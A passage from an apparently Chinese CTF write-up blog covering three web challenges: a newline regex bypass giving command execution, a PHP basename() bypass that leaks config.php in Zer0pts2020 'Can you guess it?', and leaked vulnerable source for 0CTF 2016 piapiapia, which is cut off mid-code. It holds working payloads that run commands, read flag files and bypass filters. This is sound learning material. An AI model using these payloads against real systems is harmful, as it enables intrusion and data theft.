</code></pre><p>匹配到开头为<code>{</code>，中间为<code>%0a</code>，由于后面还有一个<code>%0a</code>，不满足<code>.*$</code>，所以匹配结果为false，但是php的preg_match好像不会管字符串最后的换行符</p>
<p>找出flag位置，由于设置了PATH，用绝对路径执行命令即可：</p>
<pre tabindex="0"><code>?cmd={%0a&#34;cmd&#34;:&#34;ls%20/home/rceservice&#34;%0a}
flag
jail

?cmd={%0a&#34;cmd&#34;:&#34;/bin/cat%20/home/rceservice/flag&#34;%0a}
flag{24ba5085-75cf-45bd-aef3-46ffa53a6018}
</code></pre><p><a href="https://regexr.com/">在线匹配正则的网站</a></p>
<hr>
<h2 id="zer0pts2020can-you-guess-it">[Zer0pts2020]Can you guess it?<a hidden class="anchor" aria-hidden="true" href="#zer0pts2020can-you-guess-it">#</a></h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#39;config.php&#39;</span>; <span style="color:#75715e">// FLAG is defined in config.php
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/config\.php\/*$/i&#39;</span>, $_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>])) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">exit</span>(<span style="color:#e6db74">&#34;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;source&#39;</span>])) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">highlight_file</span>(<span style="color:#a6e22e">basename</span>($_SERVER[<span style="color:#e6db74">&#39;PHP_SELF&#39;</span>]));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">exit</span>();
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$secret <span style="color:#f92672">=</span> <span style="color:#a6e22e">bin2hex</span>(<span style="color:#a6e22e">random_bytes</span>(<span style="color:#ae81ff">64</span>));
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;guess&#39;</span>])) {
</span></span><span style="display:flex;"><span>  $guess <span style="color:#f92672">=</span> (<span style="color:#a6e22e">string</span>) $_POST[<span style="color:#e6db74">&#39;guess&#39;</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">hash_equals</span>($secret, $guess)) {
</span></span><span style="display:flex;"><span>    $message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Congratulations! The flag is: &#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">FLAG</span>;
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    $message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Wrong.&#39;</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>利用basename的漏洞：</p>
<pre tabindex="0"><code>/index.php/config.php/%ff?source

&lt;?php
define(&#39;FLAG&#39;, &#39;flag{f7488202-3627-4482-8c75-39fa925f8d72}&#39;);
</code></pre><p>参考文章：</p>
<p><a href="https://blog.51cto.com/xunansec/5356203">https://blog.51cto.com/xunansec/5356203</a></p>
<hr>
<h2 id="0ctf-2016piapiapia">[0CTF 2016]piapiapia<a hidden class="anchor" aria-hidden="true" href="#0ctf-2016piapiapia">#</a></h2>
<p>www.zip源码泄露</p>
<p>index.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;class.php&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>]) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: profile.php&#39;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">exit</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) {
</span></span><span style="display:flex;"><span>		$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>		$password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($username) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strlen</span>($username) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span>) 
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid user name&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($password) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strlen</span>($password) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span>) 
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid password&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>($user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">login</span>($username, $password)) {
</span></span><span style="display:flex;"><span>			$_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">=</span> $username;
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: profile.php&#39;</span>);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">exit</span>;	
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid user name or password&#39;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>register.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;class.php&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>]) {
</span></span><span style="display:flex;"><span>		$username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>		$password <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;password&#39;</span>];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($username) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strlen</span>($username) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span>) 
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid user name&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strlen</span>($password) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span> <span style="color:#66d9ef">or</span> <span style="color:#a6e22e">strlen</span>($password) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">16</span>) 
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid password&#39;</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">is_exists</span>($username)) {
</span></span><span style="display:flex;"><span>			$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">register</span>($username, $password);
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Register OK!&lt;a href=&#34;index.php&#34;&gt;Please Login&lt;/a&gt;&#39;</span>;		
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;User name Already Exists&#39;</span>);
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>update.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;class.php&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Login First&#39;</span>);	
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($_POST[<span style="color:#e6db74">&#39;phone&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;email&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $_POST[<span style="color:#e6db74">&#39;nickname&#39;</span>] <span style="color:#f92672">&amp;&amp;</span> $_FILES[<span style="color:#e6db74">&#39;photo&#39;</span>]) {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$username <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^\d{11}$/&#39;</span>, $_POST[<span style="color:#e6db74">&#39;phone&#39;</span>]))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid phone&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/&#39;</span>, $_POST[<span style="color:#e6db74">&#39;email&#39;</span>]))
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid email&#39;</span>);
</span></span><span style="display:flex;"><span>		
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/[^a-zA-Z0-9_]/&#39;</span>, $_POST[<span style="color:#e6db74">&#39;nickname&#39;</span>]) <span style="color:#f92672">||</span> <span style="color:#a6e22e">strlen</span>($_POST[<span style="color:#e6db74">&#39;nickname&#39;</span>]) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">10</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Invalid nickname&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$file <span style="color:#f92672">=</span> $_FILES[<span style="color:#e6db74">&#39;photo&#39;</span>];
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span>($file[<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">5</span> <span style="color:#66d9ef">or</span> $file[<span style="color:#e6db74">&#39;size&#39;</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1000000</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Photo size error&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">move_uploaded_file</span>($file[<span style="color:#e6db74">&#39;tmp_name&#39;</span>], <span style="color:#e6db74">&#39;upload/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($file[<span style="color:#e6db74">&#39;name&#39;</span>]));
</span></span><span style="display:flex;"><span>		$profile[<span style="color:#e6db74">&#39;phone&#39;</span>] <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;phone&#39;</span>];
</span></span><span style="display:flex;"><span>		$profile[<span style="color:#e6db74">&#39;email&#39;</span>] <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;email&#39;</span>];
</span></span><span style="display:flex;"><span>		$profile[<span style="color:#e6db74">&#39;nickname&#39;</span>] <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#39;nickname&#39;</span>];
</span></span><span style="display:flex;"><span>		$profile[<span style="color:#e6db74">&#39;photo&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;upload/&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">md5</span>($file[<span style="color:#e6db74">&#39;name&#39;</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">update_profile</span>($username, <span style="color:#a6e22e">serialize</span>($profile));
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Update Profile Success!&lt;a href=&#34;profile.php&#34;&gt;Your Profile&lt;/a&gt;&#39;</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>profile.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">require_once</span>(<span style="color:#e6db74">&#39;class.php&#39;</span>);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Login First&#39;</span>);	
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	$username <span style="color:#f92672">=</span> $_SESSION[<span style="color:#e6db74">&#39;username&#39;</span>];
</span></span><span style="display:flex;"><span>	$profile<span style="color:#f92672">=</span>$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">show_profile</span>($username);
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($profile  <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Location: update.php&#39;</span>);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>		$profile <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($profile);
</span></span><span style="display:flex;"><span>		$phone <span style="color:#f92672">=</span> $profile[<span style="color:#e6db74">&#39;phone&#39;</span>];
</span></span><span style="display:flex;"><span>		$email <span style="color:#f92672">=</span> $profile[<span style="color:#e6db74">&#39;email&#39;</span>];
</span></span><span style="display:flex;"><span>		$nickname <span style="color:#f92672">=</span> $profile[<span style="color:#e6db74">&#39;nickname&#39;</span>];
</span></span><span style="display:flex;"><span>		$photo <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">file_get_contents</span>($profile[<span style="color:#e6db74">&#39;photo&#39;</span>]));
</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>class.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#39;config.php&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">user</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">mysql</span>{
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">private</span> $table <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;users&#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">is_exists</span>($username) {
</span></span><span style="display:flex;"><span>		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$where <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">select</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, $where);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">register</span>($username, $password) {
</span></span><span style="display:flex;"><span>		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);
</span></span><span style="display:flex;"><span>		$password <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($password);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$key_list <span style="color:#f92672">=</span> <span style="color:#66d9ef">Array</span>(<span style="color:#e6db74">&#39;username&#39;</span>, <span style="color:#e6db74">&#39;password&#39;</span>);
</span></span><span style="display:flex;"><span>		$value_list <span style="color:#f92672">=</span> <span style="color:#66d9ef">Array</span>($username, <span style="color:#a6e22e">md5</span>($password));
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">insert</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, $key_list, $value_list);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">login</span>($username, $password) {
</span></span><span style="display:flex;"><span>		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);
</span></span><span style="display:flex;"><span>		$password <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($password);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$where <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>		$object <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">select</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, $where);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ($object <span style="color:#f92672">&amp;&amp;</span> $object<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">password</span> <span style="color:#f92672">===</span> <span style="color:#a6e22e">md5</span>($password)) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">show_profile</span>($username) {
</span></span><span style="display:flex;"><span>		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$where <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>		$object <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">select</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, $where);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> $object<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">profile</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">update_profile</span>($username, $new_profile) {
</span></span><span style="display:flex;"><span>		$username <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($username);
</span></span><span style="display:flex;"><span>		$new_profile <span style="color:#f92672">=</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">filter</span>($new_profile);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		$where <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;username = &#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39;&#34;</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">update</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, <span style="color:#e6db74">&#39;profile&#39;</span>, $new_profile, $where);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__tostring</span>() {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">__class__</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">mysql</span> {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">private</span> $link <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">connect</span>($config) {
</span></span><span style="display:flex;"><span>		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">link</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_connect</span>(
</span></span><span style="display:flex;"><span>			$config[<span style="color:#e6db74">&#39;hostname&#39;</span>],
</span></span><span style="display:flex;"><span>			$config[<span style="color:#e6db74">&#39;username&#39;</span>], 
</span></span><span style="display:flex;"><span>			$config[<span style="color:#e6db74">&#39;password&#39;</span>]
</span></span><span style="display:flex;"><span>		);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mysql_select_db</span>($config[<span style="color:#e6db74">&#39;database&#39;</span>]);
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">&#34;SET sql_mode=&#39;strict_all_tables&#39;&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">link</span>;
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">select</span>($table, $where, $ret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;*&#39;</span>) {
</span></span><span style="display:flex;"><span>		$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT </span><span style="color:#e6db74">$ret</span><span style="color:#e6db74"> FROM </span><span style="color:#e6db74">$table</span><span style="color:#e6db74"> WHERE </span><span style="color:#e6db74">$where</span><span style="color:#e6db74">&#34;</span>;
</span></span><span style="display:flex;"><span>		$result <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysql_query</span>($sql, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">link</span>);
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mysql_fetch_object</span>($result);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">insert</span>($table, $key_list, $value_list) {
</span></span><span style="display:flex;"><span>		$key <span style="color:#f92672">=</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;,&#39;</span>, $key_list);
</span></span><span style="display:flex;"><span>		$value <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;\&#39;&#39;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;\&#39;,\&#39;&#39;</span>, $value_list) <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;\&#39;&#39;</span>; 
</span></span><span style="display:flex;"><span>		$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;INSERT INTO </span><span style="color:#e6db74">$table</span><span style="color:#e6db74"> (</span><span style="color:#e6db74">$key</span><span style="color:#e6db74">) VALUES (</span><span style="color:#e6db74">$value</span><span style="color:#e6db74">)&#34;</span>;
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">mysql_query</span>($sql);
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">update</span>($table, $key, $value, $where) {
</span></span><span style="display:flex;"><span>		$sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;UPDATE </span><span style="color:#e6db74">$table</span><span style="color:#e6db74"> SET </span><span style="color:#e6db74">$key</span><span style="color:#e6db74"> = &#39;</span><span style="color:#e6db74">$value</span><span style="color:#e6db74">&#39; WHERE </span><span style="color:#e6db74">$where</span><span style="color:#e6db74">&#34;</span>;
